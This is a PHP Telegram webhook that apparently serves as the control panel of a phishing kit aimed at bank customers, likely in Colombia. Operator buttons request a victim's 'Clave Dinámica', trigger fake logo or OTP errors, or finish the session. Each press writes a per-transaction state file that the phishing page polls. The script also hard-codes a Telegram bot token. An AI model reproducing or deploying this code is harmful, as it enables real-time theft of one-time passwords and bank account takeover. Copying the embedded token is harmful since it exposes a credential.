<?php
// hook.php
date_default_timezone_set("America/Bogota");

$content = file_get_contents("php://input");
$update = json_decode($content, true);

// Token y chat_id del bot
$botToken = "7100847504:AAEx_w_mugzLVQp8HgfPxBmlhIBXzD11H_k";

// Manejo de botones
if (isset($update["callback_query"])) {
    $query = $update["callback_query"];
    $data = $query["data"];
    $callbackId = $query["id"];
    $chatId = $query["message"]["chat"]["id"];

    // Responder para evitar que el botón se quede presionado
    file_get_contents("https://api.telegram.org/bot$botToken/answerCallbackQuery?callback_query_id=$callbackId");

    // Separar tipo y transaction ID
    if (strpos($data, ":") !== false) {
        list($accion, $txId) = explode(":", $data, 2);
    } else {
        $accion = $data;
        $txId = "desconocido";
    }

    // Notificación por acción
    $mensajes = [
        "pedir_dinamica" => "🔄 Clave Dinámica solicitada - ID: $txId",
        "error_logo"     => "❌ Error de logo - ID: $txId",
        "error_otp"      => "🔁 Error OTP - ID: $txId",
        "confirm_finalizar" => "✅ Finalización Exitosa - ID: $txId",
        "finalizar"      => "🏁 Finalizó proceso - ID: $txId"
    ];

    $mensaje = $mensajes[$accion] ?? "📌 Acción desconocida: $accion - ID: $txId";

    // Enviar mensaje a Telegram
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
        "chat_id" => $chatId,
        "text" => $mensaje
    ]));

    // OPCIONAL: guarda redirección en archivo JSON (para polling desde JS si deseas)
    file_put_contents("estado_botones_$txId.json", json_encode([
        "accion" => $accion,
        "timestamp" => time()
    ]));
}
?>
